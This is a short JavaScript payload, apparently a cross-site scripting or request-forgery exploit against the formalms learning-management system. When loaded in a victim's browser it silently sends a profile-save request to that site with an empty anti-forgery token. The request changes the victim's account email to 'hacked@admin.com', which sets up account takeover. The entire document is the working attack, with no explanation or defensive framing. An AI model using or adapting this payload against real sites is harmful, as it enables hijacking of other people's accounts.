
var target = document.location.host;
var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hacked@admin.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";

function pwnEmail(){

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://" + target + "/formalms/appLms/index.php?"+params, true);
    xhr.send(null);

}

pwnEmail();
